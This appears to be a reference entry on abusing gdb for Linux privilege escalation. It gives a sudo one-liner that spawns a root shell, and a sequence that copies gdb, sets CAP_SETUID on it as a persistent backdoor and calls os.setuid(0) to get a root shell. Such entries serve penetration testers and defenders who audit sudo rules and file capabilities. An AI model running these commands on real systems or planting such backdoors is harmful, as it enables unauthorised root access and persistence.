***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * sudo gdb -nx -ex '!sh' -ex quit
***** Capabilities *****
It can manipulate its process UID and can be used on Linux as a backdoor to
maintain elevated privileges with the CAP_SETUID capability set. This also
works when executed by another binary with the capability set.
    * This requires that GDB is compiled with Python support.
      cp $(which gdb) .
      sudo setcap cap_setuid+ep gdb

      ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
